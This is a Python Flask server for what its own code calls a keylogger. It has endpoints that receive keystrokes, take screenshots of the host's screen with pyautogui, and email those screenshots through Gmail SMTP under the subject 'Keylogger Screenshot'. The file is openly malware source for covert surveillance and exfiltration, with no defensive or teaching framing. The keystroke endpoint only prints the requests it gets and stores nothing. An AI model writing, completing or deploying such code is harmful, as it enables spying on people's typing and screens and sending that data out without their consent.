from flask import Flask, jsonify, request
from flask_cors import CORS
import psycopg2
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)
CORS(app)

# Connect to Supabase PostgreSQL
def get_db_connection():
    return psycopg2.connect(
        dbname=os.getenv("DB_NAME"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASS"),
        host=os.getenv("DB_HOST"),
        port=os.getenv("DB_PORT")
    )

@app.route('/log_keystroke', methods=['POST'])
def log_keystroke():
    print(f"Request Method: {request.method}")
    print(f"Request Headers: {request.headers}")
    print(f"Request Data: {request.get_json()}")

    data = request.get_json()
    if not data or 'user_id' not in data or 'key_text' not in data:
        return jsonify({'error': 'Invalid request'}), 400
    
    return jsonify({'message': 'Keystroke logged successfully'}), 200


# --------------------------------------------

import pyautogui
from datetime import datetime

@app.route('/capture_screenshot', methods=['POST'])
def capture_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join("screenshots", filename)
        
        # Ensure the "screenshots" folder exists
        os.makedirs("screenshots", exist_ok=True)

        # Capture the screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)

        return jsonify({"message": "Screenshot captured", "file": filename}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
# ------------------------


import smtplib
import mimetypes
from email.message import EmailMessage

EMAIL_SENDER = os.getenv("SENDER_EMAIL")
EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")

@app.route('/send_email', methods=['POST'])
def send_email():
    try:
        data = request.get_json()
        filename = data.get("filename")
        if not filename:
            return jsonify({"error": "Filename required"}), 400

        filepath = os.path.join("screenshots", filename)
        if not os.path.exists(filepath):
            return jsonify({"error": "File not found"}), 404

        # Create the email
        msg = EmailMessage()
        msg["Subject"] = "Keylogger Screenshot"
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg.set_content("Screenshot attached.")

        # Attach the screenshot
        with open(filepath, "rb") as f:
            file_data = f.read()
            maintype, subtype = mimetypes.guess_type(filepath)[0].split("/")
            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=filename)

        # Send the email
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        return jsonify({"message": "Email sent successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500



if __name__ == "__main__":
    app.run(debug=True)
